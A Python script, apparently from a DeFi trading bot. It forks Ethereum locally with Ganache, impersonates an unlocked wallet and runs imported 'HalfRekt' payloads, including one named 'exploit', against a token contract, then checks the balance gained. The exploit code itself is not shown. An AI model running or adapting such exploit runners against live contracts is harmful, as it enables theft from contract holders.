import time
import atexit
import requests
from pprint import pprint

from src.config import *
from src.dev_main import execute
from src.ganache import Ganache
from src.opportunities import HalfRekt
from src.helpers import Uniswap, approve_erc20, transfer_erc20


wallet_address = "0x2493336E00A8aDFc0eEDD18961A49F2ACAf8793f"
# START HISTORICAL NODE
start_block_number = 10996939
node_path = NODE_INFO["alchemy"]["html_path"]
ganache_process = Ganache(node_path, block_number=start_block_number, unlock=[wallet_address], mine_interval=5)
ganache_process.start_node()
provider_path = ganache_process.node_path
# ganache_process, provider_path, accounts, private_keys = start_ganache(node_path, block_number=start_block_number, mine_interval=3)
# wallet_address = accounts[0]
atexit.register(lambda: ganache_process.kill())  # Closes the node after python finishes
w3 = Web3(Web3.HTTPProvider(provider_path))




start_block_number = w3.eth.blockNumber
halfrekt_address = ADDRESSES["halfrekt"]["halfrekt"]
halfrekt_contract = w3.eth.contract(address=halfrekt_address, abi=ABIS[halfrekt_address])
print(halfrekt_address)
print(start_block_number)


# Initial ETH balance
balance_eth_start = w3.eth.getBalance(wallet_address)
print(balance_eth_start)

hf = HalfRekt(w3, wallet_address)
response = hf()
if not response:
    print("No opp found")
    exit()

tx_hash_approve = execute(w3, response["payloads"][0], wallet_address)
balance_nme = halfrekt_contract.functions.balanceOf(wallet_address).call()
print("nme balance: ", balance_nme/10**18)
tx_hash_exploit = execute(w3, response["payloads"][1], wallet_address)

tx_reciept_approve = w3.eth.waitForTransactionReceipt(tx_hash_approve)
allowance = halfrekt_contract.functions.allowance(wallet_address, "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D").call()/10**18
print(allowance)
tx_reciept_exploit = w3.eth.waitForTransactionReceipt(tx_hash_exploit)
balance_nme = halfrekt_contract.functions.balanceOf(wallet_address).call()
print("nme balance: ", balance_nme/10**18)

# tx_hash_trade = execute(w3, response["payloads"][2], wallet_address)
# pprint(response["payloads"][2])

# tx_reciept_trade = w3.eth.waitForTransactionReceipt(tx_hash_trade)
balance_eth_end = w3.eth.getBalance(wallet_address)
print("eth end balance: ", balance_eth_end)
balance_nme = halfrekt_contract.functions.balanceOf(wallet_address).call()
print("nme balance: ", balance_nme/10**18)

pprint(tx_reciept_approve.blockNumber)
pprint(tx_reciept_exploit.blockNumber)
# pprint(tx_reciept_trade.blockNumber)


# ws_receiver(node_path, data_request, pprint)
# response = check_plans(start_block_number)
# requests.post("http://127.0.0.1:8545", json.dumps({"jsonrpc": "2.0","method": "miner_stop", "params": []}))  # Stop Mining
# requests.post("http://127.0.0.1:8545", json.dumps({"jsonrpc": "2.0","method": "miner_start", "params": [2]}))  # Continue mining